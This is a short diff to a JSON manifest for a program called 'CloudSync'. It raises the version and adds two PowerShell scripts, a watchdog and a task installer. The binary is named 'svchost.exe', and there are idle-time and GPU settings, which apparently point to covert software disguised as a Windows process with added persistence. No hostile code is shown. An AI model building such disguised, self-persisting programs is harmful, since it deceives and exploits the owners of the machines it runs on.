@@ -1,6 +1,6 @@
 {
   "name": "CloudSync",
-  "version": 16,
+  "version": 17,
   "binary": "svchost.exe",
   "idle_seconds": 180,
   "force_gpu": false,
@@ -132,6 +132,14 @@
     {
       "path": "cloudsync/updater.py",
       "sha256": "ab577b636b38eeb3943b4e6e5b758fdb0a3b6fedb51b49fae5f01fb9c2cf3504"
+    },
+    {
+      "path": "watchdog.ps1",
+      "sha256": "c2ab3c5e5bda64c2bfde306413a0c9d65fa3f1f67108cc68863dc4946e76a345"
+    },
+    {
+      "path": "install-task.ps1",
+      "sha256": "7cb23a9b6f2e078507c5d84f168c4e82386e1145bab10258a23c0a689c72ee11"
     }
   ]
 }
